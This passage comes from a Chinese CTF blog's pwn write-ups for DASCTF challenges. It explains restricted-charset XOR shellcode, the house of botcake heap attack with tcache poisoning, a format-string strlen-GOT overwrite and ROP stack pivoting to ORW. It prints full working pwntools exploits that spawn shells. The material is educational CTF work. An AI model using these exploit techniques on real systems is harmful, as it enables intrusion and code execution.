class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;u&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x3b</span>)<span class="comment">#rax</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401141</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;n&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#change read real address  #我打本地 read改成syscall末尾改成0x90即可，打buu远程的话，因为那边libc版本原因，应该去改成0xf</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221024201409019.png" alt="image-20221024201409019"></p>
<h2 id="1-5"><a href="#1-5" class="headerlink" title="1!5!"></a>1!5!</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="../img/image-20221024201923989.png" alt="image-20221024201923989" style="zoom:50%;" />

<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><img src="../img/image-20221024202003006.png" alt="image-20221024202003006" style="zoom:50%;" />

<p>这题考察的很明显，就是一个单纯的shellcode编写(只能用给出的机器码) ，如果通过检查的话，就将shellcode执行     题目给出的字符如下：</p>
<img src="../img/image-20221024202220891.png" alt="image-20221024202220891" style="zoom: 67%;" />



<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>这道题<code>pop rsi</code> <code>pop rdi</code> <code>syscall</code>等指令都无法使用，我们的思路是去想办法执行一次系统调用read，将数据读到mmap映射出来的区域上，这样第二次用read读的数据就不会受到程序中的check函数限制。</p>
<p>但问题是如何执行系统调用read？</p>
<p>举个例子，syscall的机器码是0x0f05。程序虽然无法写入这个0x0f05，但是却可以写入0x4141和0x4e44。而0x4141和0x4e44异或的结果是0x0f05，这样就做出来了0x0f05。</p>
<blockquote>
<p>整体思路是先将映射出来的地址0x10000给到rcx寄存器，然后我们通过如下代码,去将异或后的结果写入内存中  先让eax置空，这样去和一组数据异或的时候，就会直接被赋值为那组数据，然后再去和原本地址里的数据进行异或，进行异或后的结果又被放进了内存中。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,0x31315756</span><br><span class="line">xor dword ptr[rcx+0x50],eax</span><br></pre></td></tr></table></figure>



<p>现在就考虑怎么做出来pop rsi和pop rdi以及syscall指令。他们的机器码分别为0x5f 0x5e 0x0f05。</p>
<p>我们需要把这四个字节机器码给分成两批写入，因为0x5f5e需要异或两次做出来，而0x0f05需要异或一次做出来，如果放到一起的话第二次异或，除非我们布置一个0x0000和0x0f05异或，才可以保留0x0f05，否则0x0f05就会被改变。但是我们无法将0x0000输入进去，所以只能两批分开写入。</p>
<p>我们先将0x5f5e写入到内存里。</p>
<p>首先我们要考虑最初在0x10000上面写入0x4848(这个0x4848是啥都行，只要能通过检查，我只是最初随意找了个0x4848)。我们最后想让0x5f5e出现在内存里，那就需要去拿0x4848和0x5e5f(由于小端序)去异或一次，得到0x1617，而0x1617我们肯定是输入不进去的，所以还需要再异或一次得到0x1617。这次我找的是0x4141，因此那0x4141和0x1617异或，得到的结果是0x5756，然后发现0x5756可以输入进去。</p>
<p>因此思路为：先将0x4141写到内存，然后拿0x5756和这段内存异或，此时的内存值为0x1617。我们再拿0x4848和这段内存异或就得到了0x5e5f。</p>
<img src="../img/image-20221024213005259.png" alt="image-20221024213005259" style="zoom:50%;" />

<img src="../img/image-20221024213207843.png" alt="image-20221024213207843" style="zoom:50%;" />

<img src="../img/image-20221024213320203.png" alt="image-20221024213320203" style="zoom:50%;" />

<p>然后如法炮制构造出来syscall指令。</p>
<p>因为构造pop rdi和pop rsi指令，就意味着在这之前我们需要压栈参数。观察此时的寄存器状态，我们需要给rsi 0x10000，需要给rdi 0。正好rbx和rcx寄存器满足这个条件，而且我们还能用push rbx push rcx。所以我们在0x10050-0x2的位置写下push rbx和push rcx的机器码。</p>
<p><img src="/../img/image-20221024213552704.png" alt="image-20221024213552704"></p>
<p>最后执行系统调用read，把获取shell的shellcode给重新读入一次即可。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1324)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor eax,0x31315756</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x31314848</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x3131444e</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x52],eax</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.send((asm(shellcode).ljust(<span class="number">0x50</span>-<span class="number">2</span>,<span class="string">b&#x27;\x58&#x27;</span>)+<span class="string">b&#x27;\x51\x53&#x27;</span>+<span class="string">b&#x27;\x41&#x27;</span>*<span class="number">4</span>).ljust(<span class="number">512</span>,<span class="string">b&#x27;\x58&#x27;</span>))</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Magic-Book"><a href="#Magic-Book" class="headerlink" title="Magic_Book"></a>Magic_Book</h2><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>这道题利用的是house of botcake。第一次遇到这个手法，先简单记录一下该手法是如何利用的。</p>
<p>在2.29以后的glibc版本中加入了key机制，进入tcache bin的堆块会被添加一个key字段(也就是tcache_perthread_struct的地址)，位于chunk的bk位置。如果之后释放堆块准备进入tcache bin的时候，发现堆块的key字段位置已经是tcache_perthread_struct的地址，那就去遍历当前tcache bin，如果发现已经存在了当前堆块，那么就会报出 free(): double free detected in tcache 2的错误。</p>
<p>而house of botcake的思路是，先将堆块放入unsorted bin中(此处要利用UAF漏洞)，这样避免了key的位置是tcache_perthread_struct的地址。然后我们再次释放该堆块让其进入tcache bin，这样就绕过了检查。完成了double free，让同一个堆块即出现在了unsorted bin中又出现在了tcache bin中。</p>
<p>举个例子:</p>
<p>我们先申请七个堆块，准备一会将其释放，去填满tcache bin(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *p[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	p[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后再申请两个0x100的堆块以及一个防止和top chunk合并的堆块(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *prev=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="type">void</span> *victim=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>

<p>接着将最初的七个堆块全部释放，填满tcache bin(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">free</span>(p[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着我们先去释放位于高地址的victim，它将进入unsorted bin，然后释放位于低地址的prev，它也会进入unsorted bin，而且将与victim合并成一个更大的位于unsorted bin的一个堆块(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure>

<p>最后我们再申请出来一个0x100的堆块(因为tcache bin具有绝对的优先权，所以这个堆块会从tcache bin里取出来，而此时的tcache bin就只有6个堆块，空出来了一个)，然后我们将victim再释放掉，此时的victim进入tcache bin。这样我们只要从unsorted bin申请出来任意一个大小的堆块(能覆写到victim的fd指针并且大小不为0x100)，就可以打一个tcache poisoning。(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure>





<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221025213323159.png" alt="image-20221025213323159"></p>
<h3 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h3><p>程序没有edit函数和show函数，然后有只能用一次的UAF漏洞。对申请的字节数还有限制，最大为0x100。	</p>
<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>这题如果单纯的打house of botcake，那么后续只能打io leak泄露一个堆地址。如果想第二次打tcache poisoning的话，就必须要进行一点布局。</p>
<p>我们先看一下单纯的io leak用house of botcake是怎么布局的。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;here&#x27;</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>上面就是最简单的一个house of botcake的布局，但是需要注意的是在<code>add(0x100,&#39;here&#39;)</code>这行执行的时候，情况如下:</p>
<p><img src="/../img/image-20221026104029350.png" alt="image-20221026104029350"></p>
<p>可以看到，我们将要申请的tcache bin的堆块为0x110，而申请出来的时候，是可以控制unsorted bin的size，如果我们将unsorted bin的size改成一个更大的size(让unsorted bin里包含一个tcache bin中的堆块)，这样下次切割unsorted bin的时候，又能够控制里面被包含的那个tcache bin的堆块的fd指针，从而达到第二次的tcache poisoning。</p>
<p>不过由于2.31的glibc版本中，对unsorted bin的检查较为严格，我们还需要伪造一个size和prev_size来保证unsorted bin在篡改size后依然能通过检查。</p>
<p>最后需要注意的就是，在第一次tcache poisoning攻击后0x110的链已经无法进行第二次的tcache poisoning了，所以我们需要提前布置一条新的链，便于第二次的tcache poisoning。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#second tcache poisoning.after the first tcache poisoning,the 0x100 tcache chain will bad</span></span><br><span class="line">    <span class="comment">#so we need to prepare 0x80 tcache chain</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">14</span>+p64(<span class="number">0x180</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#size and prev_size of unsigned bin to be forged</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#take one from tcache bin</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#let the fd pointer of unsorted bin local tcache bin</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x180</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#tamper size of unsorted bin</span></span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#second tcache poisoning</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)+p64(free_hook)</span><br><span class="line">    add(<span class="number">0xb0</span>,payload)<span class="comment">#Cut a piece of memory from unsorted bin to control the fd pointer of tcache bin </span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,p64(sys_addr))  </span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;heap&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25633&quot;</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221026105053790.png" alt="image-20221026105053790"></p>
<p>最开始复现这题的时候，挺懵的。通过不断调试roderick师傅的exp，渐渐知道了这题的做法(其实是我太菜了，花了一天才弄懂)。不过最后也仅仅是知道了这题的做法和思路，但不明白这个布局是怎么做出来的，于是第二天早上把exp删了，自己重新写了一下这道题，按照自己的思考走了一遍，才彻底明白了为什么要这么布局。</p>
<p>其实这也说明了在堆的布局上，不能只知其然，更要知其所以然。</p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/16822129.html">DASCTF X GFCTF 2022十月挑战赛 pwn wp - LynneHuan - 博客园 (cnblogs.com)</a></p>
<p><a href="https://forum.butian.net/share/1709">奇安信攻防社区-深入理解 House of Botcake 堆利用手法 (butian.net)</a></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>shellcode编写</tag>
        <tag>house of botcake</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF X CBCTF 2022九月挑战赛 pwn部分wp</title>
    <url>/posts/da4f7b20.html</url>
    <content><![CDATA[<p>赛题WP</p>
<span id="more"></span>

<h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956480.png"></p>
<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956481.png"></p>
<p>首先是printf函数%s可以泄露一个libc地址(让输入写满)，然后存在一个格式化字符串的洞，但是if进行了一些检查，无法利用%p或者%x来泄露地址，出题人这里仅仅就是想让我们去任意写而非任意读。</p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>由于程序是系统调用exit退出的，因此无法劫持exit里的结构体指针。</p>
<p>发现printf执行后，执行了一个puts，考虑去劫持IO里的某些指针。考虑去伪造stdout结构体里的vtable指针，控制其偏移，让__xsputn落在one_gadget上即可。但实际操作的时候发现vtable这个基地址中出现了0x78，结果导致了if判断时被过滤掉了，因此这个思路也断了。</p>
<p>经过roderick和winmt师傅的提示，这题采用一种新的思路，来劫持libc中的got表。</p>
<p>本题的libc保护如下：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956482.png"></p>
<p>可以看见保护是Partial RELRO，这就意味着我们可以篡改其函数的got表。</p>
<p>而puts函数又调用了strlen函数，也就是在libc中执行puts函数时，又通过strlen函数的got表跳转到了strlen函数。</p>
<p>我们去劫持strlen函数的got表为one_gadget即可。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;print&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26047&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x13A0,0x13E9)</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Your name?pls..\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ec5c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">strlen_addr=libc_base+<span class="number">0x1EB0A8</span><span class="comment">#libc中strlen函数的got表地址</span></span><br><span class="line">one_gadget=search_og(<span class="number">1</span>)+libc_base</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">8</span>,writes=&#123;strlen_addr:one_gadget&#125;,numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011951983.png" alt="image-20230701195130333"></p>
<h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956483.png" alt="image-20221007232818671"></p>
<h3 id="漏洞所在：-1"><a href="#漏洞所在：-1" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956484.png" alt="image-20221007232830424"></p>
<p>这里存在一个溢出，虽然不会溢出到返回地址，但是后八个字节决定了下图read是往哪里输入的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956485.png" alt="image-20221007232842582"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956486.png" alt="image-20221007232853757"></p>
<p>上图这里泄露了一个地址，通过这个我们可以拿到程序基地址，而且这个地址也是接下来read往里面输入了0x108字节的地址。</p>
<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>其实这道题的意图很明显，出题人应该是想让我们迁移到这里(如下图)，因为这里我们是可以把rop链布置到这里的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956487.png" alt="image-20221007232903914"></p>
<p>然后去打rop，同时因为禁用了execve，因此最终应该是考虑打orw。</p>
<p>我们先看看如何迁移到这个地址上。</p>
<p>首先通过调试，我们发现如果我们在第一次输入里，最后的字节发8个a，那么最后一次的read的buf就会变成一堆a(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952330.png" alt="image-20230701195205815"></p>
<p>这个地址表面上是我们可控的，但是我们没有栈地址，因此其实是控制不了程序的执行流的。不过这里我观察了一下，这个read的buf正常的值(也就是不利用第一次输入的那个溢出)(如下)就是rbp，而正好可以控制rbp的值和返回地址(这也就是我们打栈迁移的条件)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952726.png" alt="image-20230701195216122"></p>
<h4 id="rop链的构建"><a href="#rop链的构建" class="headerlink" title="rop链的构建"></a>rop链的构建</h4><p>然后我们那边的rop链的思路是先泄露libc地址，然后再执行一次read读进来一条新的rop链来打orw。但难点是我们无法控制rdx寄存器，导致read函数用残留的rdx中数据直接读的话，只能读进来16个字节的数据。(而这新读的16个字节数据，就可以使用libc里的gadget地址了)，因此我们使用一个libc里的pop rdx的gadget再执行一次read函数，来读入更多的数据。</p>
<p>先说第一条链的第一部分（使用write函数进行libc地址的泄露（如下图），不知道为啥我这里用puts泄露不了）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011952347.png" alt="image-20230701195233742"></p>
<p>再说第一条链的第二部分（这个部分的意义就是把libc里这个pop rdx的gadget给读到内存里来，这里read函数的第二个参数需要布局一下）（如下图）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>

<p>通过对比下面两幅图，就可以发现输入前后，就把0xdeadbeef给覆盖成了pop_rdx_r12</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011953673.png" alt="image-20230701195329000"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011953823.png" alt="image-20230701195353063"></p>
<p>最后第一条链的第三部分（这部分是提前写好read的第一参数和第二个参数，但是第三个参数的位置，我用了0xdeadbeef来占位，因为在这条链的第二部分，read函数就将前两个0xdeadbeef覆盖成了pop_rdx_r12和0，这样第三条链实际上就是正常的了(第三个0xdeadbeef无所谓了，反正会被弹到r12寄存器里)）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>

<p>而执行完第一条链后，我们就可以在使用libc中任意gadget的前提下写入新的rop链。(如下图)<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954448.png" alt="image-20230701195416008"></p>
<p>为了方便，我先去利用gadget传参且执行了mprotect函数，将这个内存页直接变成可读可写可执行了，最后跟了个orw的shellcode(最后orw这里有个坑，打远程不知道为啥，正常的orw在远程读不出来flag，而本地可以读出来。这里必须要先close(0)，然后再去打开flag文件，然后read从文件描述符0里读数据才行）</p>
<p>调试过程如下：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954850.png" alt="image-20230701195425473"></p>
<p>然后先用close把标准输入给关了，再打orw即可拿到flag</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011954693.png" alt="image-20230701195435306"></p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
